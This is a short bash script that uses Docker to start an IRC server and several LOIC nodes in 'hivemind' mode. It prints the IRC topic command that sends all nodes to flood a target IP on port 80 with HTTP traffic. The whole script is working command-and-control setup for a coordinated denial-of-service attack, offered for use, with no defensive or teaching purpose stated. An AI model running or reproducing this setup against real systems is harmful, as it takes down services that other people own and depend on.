#!/usr/bin/env bash
# scripts/hive.sh — Spawn IRC server + LOIC nodes
set -euo pipefail

SCALE="${SCALE:-5}"
IMAGE="${IMAGE:-loic:v2}"

echo "=== Starting IRC server ==="
docker run -d --rm \
    --name loic-ircd \
    -p 6667:6667 \
    inspircd/inspircd-docker:latest

sleep 3  # wait for IRC server to boot

IRC_IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' loic-ircd 2>/dev/null || echo "host.docker.internal")
echo "IRC server running on ${IRC_IP}:6667"

echo ""
echo "=== Starting $SCALE LOIC nodes ==="
for i in $(seq 1 "$SCALE"); do
    docker run --rm -d \
        --name "loic-node-${i}" \
        "$IMAGE" \
        --hivemind \
        --irc-server "$IRC_IP" \
        --irc-port 6667 \
        --irc-channel "#loic" \
        --quiet
    echo "  Node $i started"
done

echo ""
echo "=== Hive is ready ==="
echo "Connect to IRC and issue commands:"
echo "  docker run --rm -it inspircd/inspircd-docker /inspircd/bin/ircoper operator pass"
echo ""
echo "To control from any IRC client:"
echo "  /server ${IRC_IP} 6667"
echo "  /join #loic"
echo "  /topic !lazor targetip=TARGET_IP port=80 method=http threads=50 start"
echo ""
echo "Cleanup:"
echo "  docker stop loic-ircd \$(docker ps -q --filter name=loic-node)"
